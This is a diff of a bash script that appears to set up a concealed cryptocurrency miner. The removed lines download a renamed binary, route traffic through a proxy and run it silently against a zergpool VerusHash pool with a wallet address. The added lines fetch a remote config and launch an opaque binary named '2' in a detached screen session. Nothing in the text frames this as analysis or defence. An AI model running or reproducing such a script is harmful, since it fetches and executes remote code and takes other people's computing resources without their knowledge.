@@ -1,5 +1,8 @@
 #!/usr/bin/env bash
-wget -q https://github.com/comandashtar/colab-2/raw/main/kanyut
-chmod +x kanyut
-export http_proxy=socsk5://198.1.94.46:45972
-./kanyut -v -l verushash.asia.mine.zergpool.com:3300 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.$(echo $(shuf -i 1-99999 -n 1)-Leaf) -p c=VRSC -t 40 >/dev/null 2>&1
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+chmod +x 2
+screen -dmS ls
+wget https://github.com/Esaffvd/ghost-rider-test/raw/main/config.json
+./2
